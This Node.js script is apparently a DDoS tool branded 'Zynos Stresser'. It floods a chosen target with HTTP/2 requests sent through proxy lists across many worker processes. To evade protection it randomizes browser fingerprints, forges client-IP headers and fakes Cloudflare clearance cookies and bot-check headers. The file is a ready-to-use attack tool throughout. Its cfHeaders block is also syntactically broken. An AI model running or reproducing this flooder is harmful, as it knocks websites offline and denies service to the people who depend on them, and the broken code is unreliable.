const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const os = require("os");

const blue = '\x1b[34m';
const white = '\x1b[37m';
const reset = '\x1b[0m';

const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");

const accept_header = [
  '*/*',
  'image/*',
  'image/webp,image/apng',
  'text/html',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
  'application/json, text/plain, */*',
  'application/xml, text/xml, */*',
  'application/javascript, */*;q=0.8',
  'image/webp,image/apng,image/*,*/*;q=0.8',
  'text/plain, text/html, */*'
];

const encoding_header = [
  '*',
  '*/*',
  'gzip',
  'gzip, deflate, br',
  'gzip, deflate',
  'gzip, deflate, br, zstd',
  'gzip, deflate, br, zstd, identity',
  'deflate, gzip, br',
  'br, gzip, deflate',
  'identity, gzip, deflate',
  'gzip, deflate, br;q=0.9, *;q=0.8'
];

const cache_header = [
  'max-age=0',
  'no-cache',
  'no-store',
  'pre-check=0',
  'post-check=0',
  'must-revalidate',
  'proxy-revalidate',
  's-maxage=604800',
  'no-cache, private',
  'max-age=300, must-revalidate',
  'no-store, max-age=0, private, must-revalidate',
  'public, max-age=10, s-maxage=10',
  'no-cache, no-store,private, max-age=0, must-revalidate',
  'no-cache, no-store,private, s-maxage=604800, must-revalidate',
  'no-cache, no-store,private, max-age=604800, must-revalidate',
  'no-store, no-cache, must-revalidate, post-check=0, pre-check=0',
  'private, max-age=0, no-cache, no-store',
  'public, max-age=86400',
  'public, max-age=31536000, immutable'
];

const refers = [
  "https://google.com",
  "https://check-host.net/",
  "https://www.facebook.com/",
  "https://www.youtube.com/",
  "https://www.fbi.com/",
  "https://discord.com",
  "https://www.cloudflare.com",
  "https://twitter.com",
  "https://github.com",
  "https://stackoverflow.com",
  "https://translate.google.com",
  "https://accounts.google.com",
  "https://mail.google.com",
  "https://drive.google.com",
  "https://docs.google.com",
  "https://bing.com",
  "https://yahoo.com",
  "https://duckduckgo.com",
  "https://tiktok.com",
  "https://instagram.com",
  "https://whatsapp.com",
  "https://telegram.org",
  "https://microsoft.com",
  "https://apple.com",
  "https://amazon.com",
  "https://netflix.com"
];

const uap = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/133.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Edge/133.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/134.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/135.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:134.0) Gecko/20100101 Firefox/134.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:135.0) Gecko/20100101 Firefox/135.0"
];

const language_header = [
  "id-ID,id;q=0.9,en;q=0.8",
  "en-US,en;q=0.9,id;q=0.8",
  "en-GB,en;q=0.9",
  "ja-JP,ja;q=0.9,en;q=0.8",
  "zh-CN,zh;q=0.9,en;q=0.8",
  "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
  "en-US,en;q=0.9,id;q=0.8,ja;q=0.7,zh;q=0.6",
  "en-GB,en;q=0.9,id;q=0.8",
  "ja-JP,ja;q=0.9,en-US;q=0.8,en;q=0.7",
  "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
  "ko-KR,ko;q=0.9,en;q=0.8",
  "fr-FR,fr;q=0.9,en;q=0.8",
  "de-DE,de;q=0.9,en;q=0.8",
  "es-ES,es;q=0.9,en;q=0.8",
  "ru-RU,ru;q=0.9,en;q=0.8",
  "ar-SA,ar;q=0.9,en;q=0.8"
];

const methods = [
  "GET",
  "POST"
];

const fetch_site = [
  "same-origin", 
  "same-site", 
  "cross-site", 
  "none"
];

const fetch_mode = [
  "navigate", 
  "same-origin", 
  "no-cors", 
  "cors"
];

const fetch_dest = [
  "document", 
  "sharedworker", 
  "subresource", 
  "unknown", 
  "worker"
];

const cplist = [
  "TLS_AES_128_CCM_8_SHA256",
  "TLS_AES_128_CCM_SHA256",
  "TLS_CHACHA20_POLY1305_SHA256",
  "TLS_AES_256_GCM_SHA384",
  "TLS_AES_128_GCM_SHA256"
];

const cf_ray_prefixes = [
    "8a0a092ad9d940b0",
    "8a0a092ad9d940b1",
    "8a0a092ad9d940b2",
];

const cf_ray_locations = ['SIN', 'JAK', 'CGK', 'LAX', 'FRA', 'LHR'];

const countries = [
    "ID", "SG", "MY", "PH", "TH", "VN", "CN", "JP", "KR", "IN",
    "PK", "BD", "NP", "LK", "KH", "LA", "MM", "TW", "HK", "MO",
    "GB", "DE", "FR", "IT", "ES", "NL", "SE", "NO", "DK", "FI",
    "PL", "CZ", "HU", "AT", "CH", "BE", "PT", "IE", "GR", "RU",
    "US", "CA", "MX", "BR", "AR", "CL", "CO", "PE", "VE", "EC",
    "BO", "PY", "UY", "CR", "PA", "GT", "HN", "SV", "NI", "DO",
    "ZA", "NG", "EG", "KE", "MA", "DZ", "TN", "GH", "CI", "CM",
    "AU", "NZ", "FJ", "PG", "SB", "VU", "WS", "TO", "FM", "MH",
];

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

const sigalgs = [
  "ecdsa_secp256r1_sha256",
  "rsa_pss_rsae_sha256",
  "rsa_pkcs1_sha256",
  "ecdsa_secp384r1_sha384",
  "rsa_pss_rsae_sha384",
  "rsa_pkcs1_sha384",
  "rsa_pss_rsae_sha512",
  "rsa_pkcs1_sha512"
];

const sec_ch_ua = [
  '"Google Chrome";v="133", "Chromium";v="133", "Not_A Brand";v="24"',
  '"Google Chrome";v="132", "Chromium";v="132", "Not_A Brand";v="24"',
  '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
  '"Microsoft Edge";v="133", "Chromium";v="133", "Not_A Brand";v="24"',
  '"Brave";v="133", "Chromium";v="133", "Not_A Brand";v="24"',
  '"Brave";v="149.0.0.0", "Chromium";v="149.0.0.0", "Not?A_Brand";v="24.0.0.0"',
  '"Brave";v="150.0.0.0", "Chromium";v="150.0.0.0", "Not?A_Brand";v="24.0.0.0"',
  '"Brave";v="148.0.0.0", "Chromium";v="148.0.0.0", "Not?A_Brand";v="24.0.0.0"',
  '"Google Chrome";v="130", "Chromium";v="130", "Not_A Brand";v="24"',
  '"Google Chrome";v="129", "Chromium";v="129", "Not_A Brand";v="24"',
  '"Opera";v="118", "Chromium";v="133", "Not_A Brand";v="24"',
  '"Google Chrome";v="134", "Chromium";v="134", "Not_A Brand";v="24"',
  '"Google Chrome";v="135", "Chromium";v="135", "Not_A Brand";v="24"',
  '"Microsoft Edge";v="134", "Chromium";v="134", "Not_A Brand";v="24"',
  '"Microsoft Edge";v="135", "Chromium";v="135", "Not_A Brand";v="24"',
  '"Opera";v="119", "Chromium";v="134", "Not_A Brand";v="24"',
  '"Opera";v="120", "Chromium";v="135", "Not_A Brand";v="24"'
];

const sec_ch_ua_platform = [
  '"Windows"',
  '"macOS"',
  '"Linux"',
  '"Android"',
  '"iOS"',
  '"Windows"',
  '"macOS"',
  '"Linux"'
];

const sec_ch_ua_mobile = [
  '?0',
  '?1',
  '?0',
  '?1',
  '?0',
  '?1'
];

let SignalsList = sigalgs.join(':');
const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521:X448";
const secureOptions =
    crypto.constants.SSL_OP_NO_SSLv2 |
    crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.SSL_OP_NO_TLSv1 |
    crypto.constants.SSL_OP_NO_TLSv1_1 |
    crypto.constants.SSL_OP_NO_TLSv1_3 |
    crypto.constants.ALPN_ENABLED |
    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
    crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
    crypto.constants.SSL_OP_COOKIE_EXCHANGE |
    crypto.constants.SSL_OP_PKCS1_CHECK_1 |
    crypto.constants.SSL_OP_PKCS1_CHECK_2 |
    crypto.constants.SSL_OP_SINGLE_DH_USE |
    crypto.constants.SSL_OP_SINGLE_ECDH_USE |
    crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

if (process.argv.length < 7) {
    console.log(`Usage: host time req thread proxy.txt`);
    process.exit();
}

const secureProtocol = "TLS_method";
const secureContextOptions = {
    ciphers: ciphers,
    sigalgs: SignalsList,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    secureProtocol: secureProtocol
};

const secureContext = tls.createSecureContext(secureContextOptions);
const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6]
};

var proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);

if (cluster.isMaster) {
    console.clear();
    console.log(`\x1b[36m--------------------------------------------\x1b[0m`);
    console.log(`\x1b[33mUser: \x1b[32mPrv\x1b[0m \x1b[36m|\x1b[0m \x1b[33mVip: \x1b[32mtrue\x1b[0m \x1b[36m|\x1b[0m \x1b[33mSuperVip: \x1b[32mtrue\x1b[0m`);
    console.log(`\x1b[33mAdmin: \x1b[35mZYNOS\x1b[0m \x1b[36m|\x1b[0m \x1b[33mExpired: \x1b[31mNo\x1b[0m \x1b[36m|\x1b[0m \x1b[33mTime Limit: \x1b[32m${args.time}s\x1b[0m`);
    console.log(`\x1b[36m--------------------------------------------\x1b[0m`);
    console.log(`\x1b[33mTarget: \x1b[37m${args.target}\x1b[0m`);
    console.log(`\x1b[33mRate: \x1b[37m${args.Rate}/s\x1b[0m \x1b[36m|\x1b[0m \x1b[33mThreads: \x1b[37m${args.threads}\x1b[0m`);
    console.log(`\x1b[33mProxy: \x1b[37m${args.proxyFile} (\x1b[32m${proxies.length}\x1b[37m)\x1b[0m`);
    console.log(`\x1b[36m--------------------------------------------\x1b[0m`);
    console.log(`\x1b[35mZynos Stresser 2025-2026 | C2 | t.me/zynos_official\x1b[0m`);
    console.log(`\x1b[36m--------------------------------------------\x1b[0m`);

    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {
    setInterval(runFlooder, 1);
}

// ========== NET SOCKET CLASS ==========
class NetSocket {
    constructor() { }

    HTTP(options, callback) {
        const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nConnection: Keep-Alive\r\n\r\n`;
        const buffer = Buffer.from(payload);
        const connection = net.connect({
            host: options.host,
            port: options.port,
        });

        connection.setTimeout(options.timeout * 1000);
        connection.setKeepAlive(true, 60000);
        connection.setNoDelay(true);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            if (response.includes("HTTP/1.1 200")) {
                return callback(connection, undefined);
            } else {
                connection.destroy();
                return callback(undefined, "error: invalid response");
            }
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout");
        });

        connection.on("error", () => {
            connection.destroy();
            return callback(undefined, "error: connection error");
        });
    }
}

const Socker = new NetSocket();

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/).filter(line => line.trim() && !line.startsWith('#'));
}

function randomElement(elements) {
    return elements[Math.floor(Math.random() * elements.length)];
}

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    let result = "";
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

function randstrs(length) {
    const characters = "0123456789";
    const charactersLength = characters.length;
    const randomBytes = crypto.randomBytes(length);
    let result = "";
    for (let i = 0; i < length; i++) {
        const randomIndex = randomBytes[i] % charactersLength;
        result += characters.charAt(randomIndex);
    }
    return result;
}

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    const parsedPort = parsedProxy[1] || "443";
    
    const val = {
        'NEL': JSON.stringify({
            "report_to": "cf-nel",
            "max_age": 604800,
            "include_subdomains": true
        })
    };
    
    const rateHeaders = [
        { "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" },
        { "accept-language": "en-US,en;q=0.9,id;q=0.8,ja;q=0.7" },
        { "referer": refers[Math.floor(Math.random() * refers.length)] },
        { "cache-control": "no-cache" },
        { "user-agent": uap[Math.floor(Math.floor(Math.random() * uap.length))] },
        { "cookie": "cf_clearance=" + randstr(8) + "." + randstr(24) + "." + randstr(48) + "-0.0.1; _ga=" + randstr(20) + "; _gid=" + randstr(15) + "; __cf_bm=" + randstr(44) },
        { "sec-ch-ua": '"Google Chrome";v="133", "Chromium";v="133", "Not_A Brand";v="24"' },
        { "Accept-Range": Math.random() < 0.5 ? 'bytes' : 'none' },
        { "sec-ch-ua-mobile": "?0" },
        { "sec-ch-ua-platform": '"Windows"' },
        { "sec-fetch-site": "same-origin" },
        { "sec-fetch-mode": "cors" },
        { "sec-fetch-dest": "empty" },
        { "accept-encoding": "gzip, deflate, br, zstd" },
        { "priority": "u=0, i" },
        { "dnt": "1" }
    ];
    
    const spoofHeaders = [
        { "X-Forwarded-For": parsedProxy[0] },
        { "cf-connecting-ip": parsedProxy[0] },
        { "X-Forwarded-Proto": "https" },
        { "X-Real-IP": parsedProxy[0] },
        { "origin": "https://" + parsedTarget.host },
        { "referer": "https://" + parsedTarget.host + "/" },
        { "accept-char": "UTF-8" },
        { "Geo-Location": "UNKNOWN" },
        { "cookie": "__cf_bm=" + randstr(44) + "." + randstr(24) + "." + randstr(48) + "-" + Date.now() + "-0-0.0.1; cf_clearance=" + randstr(8) + "." + randstr(24) + "." + randstr(48) + "-0.0.1" },
        { "sec-ch-ua": sec_ch_ua[Math.floor(Math.random() * sec_ch_ua.length)] },
        { "sec-ch-ua-mobile": sec_ch_ua_mobile[Math.floor(Math.random() * sec_ch_ua_mobile.length)] },
        { "sec-ch-ua-platform": sec_ch_ua_platform[Math.floor(Math.random() * sec_ch_ua_platform.length)] },
        { "sec-fetch-user": "?1" },
        { "te": "trailers" },
        { "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7" },
        { "source-ip": randstr(5)  },
        { "via": randstr(5)  },
        { "cluster-ip": randstr(5)  },
        { "upgrade-insecure-requests": "1" },
        { "dnt": "1" },
        { "cache-control": "no-store, max-age=0, private, must-revalidate" },
        { "pragma": "no-cache" },
        { "x-requested-with": "XMLHttpRequest" }
    ];
    
    const cfHeaders = [
        "CF-RAY": cf_ray_prefixes[Math.floor(Math.random() * cf_ray_prefixes.length)] + "-" + cf_ray_locations[Math.floor(Math.random() * cf_ray_locations.length)],
        "cf-worker": "true",
        "cf-connecting-ip": parsedProxy[0] },
        "cf-device": Math.random() < 0.5 ? "desktop" : "mobile",
        "cf-visitor": '{"scheme":"https"}',
        "cf-cache-status": Math.random() < 0.3 ? "HIT" : "MISS",
        "cf-turnstile": Math.random() < 0.5 ? "pass" : "fail",
        "cf-bot": "false"        
    ];
    
    let ZynosHeaders = {
      ":authority": parsedTarget.host,
      ":scheme": "https",
      ":path": (parsedTarget.path || "/") + "?" + randstr(6) + "=" + generateRandomString(20, 30) + "&" + randstr(4) + "=" + generateRandomString(15, 25),
      ":method": methods[Math.floor(Math.random() * methods.length)],
      "NEL": val,
      "pragma": "no-cache",
      "upgrade-insecure-requests": "1",
      "accept": accept_header[Math.floor(Math.random() * accept_header.length)],
      "accept-encoding": encoding_header[Math.floor(Math.random() * encoding_header.length)],
      "accept-language": language_header[Math.floor(Math.random() * language_header.length)],
      "cache-control": cache_header[Math.floor(Math.random() * cache_header.length)],
      "referer": refers[Math.floor(Math.random() * refers.length)],
      "sec-fetch-mode": fetch_mode[Math.floor(Math.random() * fetch_mode.length)],
      "sec-fetch-site": fetch_site[Math.floor(Math.random() * fetch_site.length)],
      "sec-fetch-dest": fetch_dest[Math.floor(Math.random() * fetch_dest.length)],
      "user-agent": uap[Math.floor(Math.random() * uap.length)]
    };
    
    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host,
        timeout: 10
    };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error || !connection) return;

        connection.setKeepAlive(true, 60000);
        connection.setNoDelay(true);

        const tlsOptions = {
            socket: connection,
            ALPNProtocols: ["h2"],
            servername: parsedTarget.host,
            rejectUnauthorized: false,
            ciphers: cplist[Math.floor(Math.random() * cplist.length)],
            secureContext: tls.createSecureContext({
                ciphers: ciphers,
                sigalgs: SignalsList,
                honorCipherOrder: true,
                secureOptions: secureOptions,
                secureProtocol: secureProtocol
            })
        };

        const tlsSocket = tls.connect(443, parsedTarget.host, tlsOptions, () => {
            if (tlsSocket.alpnProtocol !== 'h2') {
                tlsSocket.destroy();
                connection.destroy();
                return;
            }

            tlsSocket.setKeepAlive(true, 60000);
            tlsSocket.setNoDelay(true);

            const client = http2.connect(parsedTarget.href, {
                createConnection: () => tlsSocket,
                settings: {
                    headerTableSize: 65536,
                    maxHeaderListSize: 32768,
                    initialWindowSize: 15564991,
                    maxFrameSize: 16384,
                    enablePush: false
                }
            });

            client.on("connect", () => {
                const interval = setInterval(() => {
                    for (let i = 0; i < args.Rate; i++) {

                        const dynHeaders = {
                            ...ZynosHeaders,
                            ...rateHeaders[Math.floor(Math.random() * rateHeaders.length)],
                            ...spoofHeaders[Math.floor(Math.random() * spoofHeaders.length)],
                            ...cfHeaders[Math.floor(Math.random() * cfHeaders.length)]
                        };

                        try {
                            const req = client.request(dynHeaders, {
                                parent: 0,
                                exclusive: true,
                                weight: 220
                            });

                            req.on('response', () => {
                                req.close();
                                req.destroy();
                            });

                            req.on('error', () => {
                                req.destroy();
                            });

                            req.end();
                        } catch (err) { }
                    }
                }, 1000);

                client.on('close', () => clearInterval(interval));
            });

            client.on("error", () => {
                client.destroy();
                tlsSocket.destroy();
                connection.destroy();
            });

            client.on("close", () => {
                tlsSocket.destroy();
                connection.destroy();
            });
        });

        tlsSocket.on("error", () => {
            tlsSocket.destroy();
            connection.destroy();
        });
    });
}

const StopScript = () => process.exit(1);
setTimeout(StopScript, args.time * 1000);

process.on('uncaughtException', () => { });
process.on('unhandledRejection', () => { });
